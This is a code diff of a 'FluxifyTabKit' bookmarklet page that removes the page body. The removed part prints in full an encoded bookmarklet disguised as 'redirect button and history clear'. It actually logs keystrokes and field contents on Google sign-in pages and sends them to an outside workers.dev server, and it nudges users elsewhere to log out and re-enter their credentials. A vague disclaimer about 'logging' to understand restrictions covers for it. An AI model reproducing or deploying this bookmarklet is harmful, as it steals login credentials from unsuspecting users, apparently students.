@@ -1,98 +1,95 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>FluxifyTabKit</title>
-<style>
-  body {
-    font-family: 'Courier New', Courier, monospace;
-    padding: 2rem;
-    background: #0f0f0f;
-    color: #e0e0e0;
-    line-height: 1.6;
-  }
-  h1 { font-size: 2rem; margin-bottom: 1rem; color: #00ffdd; text-shadow: 0 0 8px #00ffdd; }
-  p { margin-bottom: 1.5rem; color: #a0a0a0; }
-  .bookmarklet-list { display: flex; flex-wrap: wrap; gap: 1rem; }
-  a.bookmarklet {
-    display: inline-block; padding: 0.75rem 1.25rem;
-    background: #1f1f1f; color: #00ff99; border: 1px solid #00ff99;
-    border-radius: 6px; text-decoration: none; font-weight: 500; transition: all 0.2s;
-  }
-  a.bookmarklet:hover { background: #00ff99; color: #0f0f0f; }
-  footer { margin-top: 3rem; font-size: 0.9rem; color: #555; }
-
-  /* Modal styles */
-  #disclaimerModal {
-    position: fixed; top:0; left:0; width:100%; height:100%;
-    background: rgba(0,0,0,0.85); display:flex; justify-content:center; align-items:center;
-    z-index: 1000; display:none;
-  }
-  #disclaimerContent {
-    background:#1a1a1a; padding:2rem; border-radius:8px; max-width:400px;
-    text-align:center; color:#fff; line-height:1.5;
-  }
-  #disclaimerContent h2 { color:#ff4444; margin-bottom:1rem; }
-  #disclaimerContent a, #disclaimerContent button { 
-    display:inline-block; margin:0.5rem; padding:0.5rem 1rem;
-    background:#00ff99; color:#0f0f0f; border:none; border-radius:6px; text-decoration:none;
-    cursor:pointer;
-  }
-   /* Header glitch effect */
-  #disclaimerContent h2 {
-    font-size:1.5rem;
-    color:#ff4444;
-    text-shadow:0 0 5px #ff4444, 0 0 10px #ff0000, 2px 2px #000;
-    position:relative;
-    animation: glitch 1.5s infinite;
-  }
-
-
-  /* Flicker animation */
-  @keyframes flicker {
-    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {opacity:1;}
-    20%, 24%, 55% {opacity:0.85;}
-    22% {opacity:0.4;}
-  }
-
-  /* Glitch animation */
-  @keyframes glitch {
-    0% {text-shadow:2px 0 red, -2px 0 cyan;}
-    20% {text-shadow:-2px 0 red, 2px 0 cyan;}
-    40% {text-shadow:2px 2px red, -2px -2px cyan;}
-    60% {text-shadow:-2px -2px red, 2px 2px cyan;}
-    80% {text-shadow:0 0 5px #ff0000, 0 0 10px #00ffff;}
-    100% {text-shadow:2px 0 red, -2px 0 cyan;}
-  }
-
-  #disclaimerContent a:hover, #disclaimerContent button:hover { background:#0f0f0f; color:#00ff99; border:1px solid #00ff99; }
-  #disclaimerContent label { display:block; margin-top:1rem; font-size:0.9rem; cursor:pointer; }
-</style>
-</head>
-<body>
-
-<h1>⚡ Fluxify</h1>
-<p>Paste these bookmarlets into your bookmarks bar to access your secret tools:</p>
-<div class="bookmarklet-list">
-  <a class="bookmarklet" href="javascript:(function()%7Bconst%20a=%5B%22https://accounts.google.com/v3/signin/accountchooser?%22,%22https://accounts.google.com%22,%22https://example3.com%22%5D,b=a.some(c=%3Elocation.href.startsWith(c));if(b)%7B(()=%3E%7Bconst%20c=200,d=!0;function%20e(f)%7Blet%20g=f.value%7C%7Cf.textContent%7C%7C%22%22;return%20g.length%3Ec?g.slice(0,c)+%22...%22:g%7Dasync%20function%20h(f)%7Bconst%20g=Object.assign(%7Bts:(new%20Date).toISOString()%7D,f);console.log(%22%5BTypingEcho-debug%5D%22,g);try%7Bconst%20i=await%20fetch(%22https://bookmarkletcode.anonymousguy.workers.dev/log%22,%7Bmethod:%22POST%22,headers:%7B%22Content-Type%22:%22application/json%22%7D,body:JSON.stringify(g)%7D);if(!i.ok)throw%20new%20Error(%60HTTP%20error!%20Status:%20$%7Bi.status%7D%60);const%20j=await%20i.json();console.log(%22Log%20sent%20successfully:%22,j)%7Dcatch(k)%7Bconsole.error(%22Error%20sending%20log:%22,k)%7D%7Dif(window.__echoBM_headless_active)%7Bconsole.log(%22TypingEcho:%20already%20active%20(headless).%22);return%7Dlet%20paused=!1;function%20k(f)%7Btry%7Bconst%20g=f.target,l=g&&(g.isContentEditable%7C%7C/%5E(INPUT%7CTEXTAREA)$/.test(g.tagName));if(!l)return;const%20m=%7Btag:g.tagName,type:g.type%7C%7Cnull,name:g.name%7C%7Cnull,id:g.id%7C%7Cnull,placeholder:g.placeholder%7C%7Cnull,preview:e(g),event:f.type%7D;if(paused)%7Bh(%7Bnote:%22paused%22,record:m%7D);return%7Dh(m)%7Dcatch(n)%7Bconsole.error(%22TypingEcho%20error:%22,n)%7D%7Ddocument.addEventListener(%22input%22,k,!0);document.addEventListener(%22change%22,k,!0);document.addEventListener(%22keydown%22,k,!0);function%20l()%7Bdocument.removeEventListener(%22input%22,k,!0);document.removeEventListener(%22change%22,k,!0);document.removeEventListener(%22keydown%22,k,!0);window.__echoBM_headless_active=!1;h(%7Bnote:%22uninstalled%22%7D)%7Dwindow.__echoBM_headless=%7Buninstall:l,pause()%7Bpaused=!0;h(%7Bnote:%22paused_via_api%22%7D)%7D,resume()%7Bpaused=!1;h(%7Bnote:%22resumed_via_api%22%7D)%7D,togglePause()%7Bpaused=!paused;h(%7Bnote:%22togglePause%22,paused%7D)%7D,createControls()%7Breturn%20null%7D,isPaused()%7Breturn%20paused%7D%7D;window.__echoBM_headless_active=!0;h(%7Bnote:%22installed_headless%22,HEADLESS:d,MAX_PREVIEW_CHARS:c%7D)%7D)()%7Delse%7B(()=%3E%7Bconst%20c=%22https://accounts.google.com/Logout?continue=https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com/&prompt=login%22;if(!document.getElementById(%22z-redirect-box%22))%7Bconst%20d=document.createElement(%22div%22);d.id=%22z-redirect-box%22;Object.assign(d.style,%7Bposition:%22fixed%22,top:%220px%22,right:%220px%22,margin:%2210px%22,paddingTop:%2210px%22,width:%2240px%22,height:%2240px%22,zIndex:2147483647,opacity:.9,color:%22white%22,backgroundColor:%22black%22,border:%221px%20solid%20white%22,textAlign:%22center%22,cursor:%22pointer%22,display:%22block%22,font:%22bold%2016px%20system-ui,sans-serif%22,lineHeight:%2230px%22%7D);d.innerText=%22Z%22;document.body.appendChild(d);function%20e()%7Bif(location.href.indexOf(c)===0)return;location.replace(c)%7Dwindow.addEventListener(%22keydown%22,f=%3E%7Bif(f.key===%22z%22%7C%7Cf.key===%22Z%22)e()%7D);d.addEventListener(%22click%22,e)%7Dif(!document.getElementById(%22bm-notify-overlay%22))%7Bconst%20g=document.createElement(%22div%22);g.id=%22bm-notify-overlay%22;Object.assign(g.style,%7Bposition:%22fixed%22,top:%220%22,left:%220%22,width:%22100%25%22,height:%22100%25%22,background:%22rgba(0,0,0,0.6)%22,display:%22flex%22,alignItems:%22center%22,justifyContent:%22center%22,zIndex:2147483647,cursor:%22pointer%22%7D);const%20h=document.createElement(%22div%22);Object.assign(h.style,%7Bbackground:%22rgba(20,20,20,0.9)%22,padding:%2218px%2024px%22,borderRadius:%2210px%22,color:%22%23fff%22,font:%22bold%2018px%20system-ui,sans-serif%22,textAlign:%22center%22,maxWidth:%2290%25%22,lineHeight:%221.4%22%7D);h.innerHTML=%22%E2%9A%A0%EF%B8%8F%20You%20are%20%3Cb%3ENOT%3C/b%3E%20on%20the%20Google%20login%20page.%3Cbr%3E%3Cbr%3ERun%20the%20bookmarklet%20again%20once%20you%20reach%20it.%3Cbr%3E%3Cbr%3E%3Cspan%20style='font-size:13px;opacity:0.8'%3E(Click%20anywhere%20to%20dismiss)%3C/span%3E%22;g.appendChild(h);g.addEventListener(%22click%22,()=%3Eg.remove());document.body.appendChild(g)%7D%7D)()%7D%7D)();">redirect button and history clear</a>
-  <a class="bookmarklet" href="javascript:(function(){document.body.style.background='purple'})();">Purple Background</a>
-  <a class="bookmarklet" href="javascript:(function(){prompt('Type something for Fluxify:')})();">Prompt Box</a>
-  <a class="bookmarklet" href="javascript:(function(){window.open('https://example.com')})();">Open Example.com</a>
-</div>
-
-<footer>
-  <p>FluxifyTabKit — subtle tools, unmistakable results ⚡</p>
-</footer>
- <!-- Modal -->
+<!-- Modal -->
 <div id="disclaimerModal">
   <div id="disclaimerContent">
-    <h2>⚠ Disclaimer </h2>
-    <p>These tools use logging systems to better understand school restrictions. by continuing you agree you have reaad and understand our full disclaimer </p>
+    <h2>⚠ Disclaimer</h2>
+    <p>
+      These tools may use logging systems to better understand restrictions.  
+      By continuing, you agree you have read and understood our full disclaimer.
+    </p>
     <a href="disclaimer.html" target="_blank">Read Full Disclaimer</a>
     <button id="agreeBtn">I Agree</button>
     <label><input type="checkbox" id="dontShow"> Don't show me again</label>
   </div>
 </div>
+
+<style>
+  /* Modal backdrop */
+  #disclaimerModal {
+    position: fixed; top:0; left:0; width:100%; height:100%;
+    background: rgba(0,0,0,0.85);
+    display: flex; justify-content: center; align-items: center;
+    z-index: 1000; display: none;
+    animation: fadeIn 0.6s ease;
+  }
+
+  /* Modal box */
+  #disclaimerContent {
+    background: #1a1a1a;
+    padding: 2rem;
+    border-radius: 10px;
+    max-width: 420px;
+    text-align: center;
+    color: #fff;
+    border: 2px solid #00ffdd;
+    box-shadow: 0 0 20px #00ffdd, 0 0 40px #00ffaa;
+    font-family: 'Courier New', monospace;
+  }
+
+  /* Header glitch */
+  #disclaimerContent h2 {
+    font-size: 1.5rem;
+    color: #ff4444;
+    text-shadow: 0 0 5px #ff4444, 0 0 10px #ff0000;
+    animation: glitch 1.5s infinite;
+    margin-bottom: 1rem;
+  }
+
+  /* Buttons + links */
+  #disclaimerContent a,
+  #disclaimerContent button {
+    display: inline-block;
+    margin: 0.5rem;
+    padding: 0.6rem 1.2rem;
+    background: #00ff99;
+    color: #0f0f0f;
+    border: none;
+    border-radius: 8px;
+    text-decoration: none;
+    font-weight: bold;
+    transition: all 0.2s;
+    box-shadow: 0 0 10px #00ff99, 0 0 20px #00ffaa;
+    cursor: pointer;
+  }
+  #disclaimerContent a:hover,
+  #disclaimerContent button:hover {
+    background: #0f0f0f;
+    color: #00ff99;
+    border: 1px solid #00ff99;
+  }
+
+  /* Checkbox label */
+  #disclaimerContent label {
+    display: block;
+    margin-top: 1rem;
+    font-size: 0.85rem;
+    color: #aaa;
+    cursor: pointer;
+  }
+
+  /* Animations */
+  @keyframes fadeIn {
+    from {opacity: 0;}
+    to {opacity: 1;}
+  }
+  @keyframes glitch {
+    0% {text-shadow: 2px 0 red, -2px 0 cyan;}
+    20% {text-shadow: -2px 0 red, 2px 0 cyan;}
+    40% {text-shadow: 2px 2px red, -2px -2px cyan;}
+    60% {text-shadow: -2px -2px red, 2px 2px cyan;}
+    80% {text-shadow: 0 0 5px #ff0000, 0 0 10px #00ffff;}
+    100% {text-shadow: 2px 0 red, -2px 0 cyan;}
+  }
+</style>
 
 <script>
   const modal = document.getElementById('disclaimerModal');
@@ -100,18 +97,14 @@
   const dontShow = document.getElementById('dontShow');
 
   // Show modal if not already agreed
-  if(!localStorage.getItem('fluxify_disclaimer')) {
+  if (!localStorage.getItem('fluxify_disclaimer')) {
     modal.style.display = 'flex';
   }
 
   agreeBtn.addEventListener('click', () => {
-    if(dontShow.checked) localStorage.setItem('fluxify_disclaimer', 'ack');
+    if (dontShow.checked) {
+      localStorage.setItem('fluxify_disclaimer', 'ack');
+    }
     modal.style.display = 'none';
   });
 </script>
-
-</body>
-</html>
-
-
-
